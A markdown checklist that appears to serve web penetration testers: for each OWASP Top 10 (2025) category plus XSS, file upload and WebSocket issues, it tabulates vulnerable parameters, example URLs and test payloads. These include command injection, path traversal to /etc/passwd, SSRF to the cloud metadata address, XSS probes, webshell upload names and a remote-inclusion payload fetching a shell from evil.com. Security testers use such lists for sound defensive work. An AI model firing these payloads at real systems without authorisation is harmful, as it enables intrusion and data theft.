# OWASP Top 10 – 2025  
## Vulnerability Parameters & Payloads (Comprehensive Checklist)

---

## A01 – Broken Access Control (IDOR)

| Parameter | Example URL | Payload |
|---------|------------|---------|
| id | /api/user?id= | 1 |
| user_id | /profile?user_id= | 2 |
| account | /account?account= | admin |
| order_id | /order?order_id= | 999 |
| file_id | /download?file_id= | 10 |
| uuid | /api/resource?uuid= | random-uuid |
| role | /api/user | {"role":"admin"} |

---

## A02 – Cryptographic Failures (JWT / API Keys)

| Parameter | Location | Payload |
|---------|----------|---------|
| Authorization | Header | Bearer null |
| token | /api/data?token= | invalid |
| jwt | Cookie | modify sub / role |
| api_key | /api?api_key= | test |
| access_token | /auth | expired token |
| refresh_token | /auth/refresh | reuse old token |

---

## A03 – Injection (RFI / RCE / Command)

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| cmd | /exec?cmd= | id |
| exec | /run?exec= | whoami |
| page | /index.php?page= | http://evil.com/shell.txt |
| file | /load?file= | ../../../../etc/passwd |
| template | /view?template= | php://filter/convert.base64-encode/resource=index.php |
| path | /include?path= | /proc/self/environ |
| input | /api | `; ls -la` |

---

## A04 – Insecure Design (Open Redirect)

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| url | /redirect?url= | https://evil.com |
| next | /login?next= | //evil.com |
| return | /go?return= | http://evil.com |
| redirect | /out?redirect= | /\/evil.com |
| continue | /auth?continue= | https://evil.com |
| target | /jump?target= | evil.com |

---

## A05 – Security Misconfiguration (Sensitive Info Leak)

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| debug | /app?debug= | true |
| verbose | /api?verbose= | 1 |
| trace | /error?trace= | true |
| test | /test?mode= | test |
| env | /.env | open directly |
| config | /config | open directly |
| logs | /logs | open directly |

---

## A06 – Vulnerable Components (Service / Endpoint Map)

| Endpoint | Example URL | Payload |
|---------|-------------|---------|
| swagger | /swagger | open directly |
| api-docs | /v3/api-docs | open directly |
| openapi | /openapi.json | open directly |
| actuator | /actuator | open directly |
| metrics | /metrics | open directly |
| health | /health | open directly |
| admin | /admin | direct access |

---

## A07 – Identification & Authentication Failures

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| username | /login | admin |
| password | /login | empty |
| remember | /login | true |
| otp | /verify | 000000 |
| session | Cookie | reuse old session |
| reset_token | /reset | brute force |

---

## A08 – Software & Data Integrity Failures

| Parameter | Location | Payload |
|---------|----------|---------|
| update | /update | malicious URL |
| import | /import | crafted file |
| file | /upload | tampered archive |
| package | /install | unsigned package |
| webhook | /webhook | attacker endpoint |

---

## A09 – Logging & Monitoring Failures

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| login | /login | brute force |
| reset | /reset | multiple attempts |
| api | /api | mass requests |
| error | /error | trigger exception |
| audit | /audit | missing logs |

---

## A10 – Server-Side Request Forgery (SSRF)

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| url | /fetch?url= | http://127.0.0.1 |
| link | /proxy?link= | http://localhost |
| target | /load?target= | http://169.254.169.254 |
| image | /image?image= | file:///etc/passwd |
| callback | /webhook | internal service |

---

## DOM XSS (Client-Side Injection)

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| q | /?q= | <script>alert(1)</script> |
| query | /search?query= | "><img src=x onerror=alert(1)> |
| msg | /msg?msg= | <svg/onload=alert(1)> |
| text | /view?text= | javascript:alert(1) |
| hash | /#input | <script>alert(1)</script> |

---

## File Upload (RCE Candidate)

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| file | /upload | shell.php.jpg |
| image | /upload | shell.php.png |
| avatar | /profile/upload | php webshell |
| document | /docs/upload | .php disguised |
| zip | /import | zip slip |

---

## WebSocket Security

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| ws | wss://site/ws | connect unauth |
| channel | wss://site/ws?channel= | admin |
| action | WS message | {"action":"admin"} |
| user_id | WS message | {"user_id":1} |
| token | WS header | missing token |

---
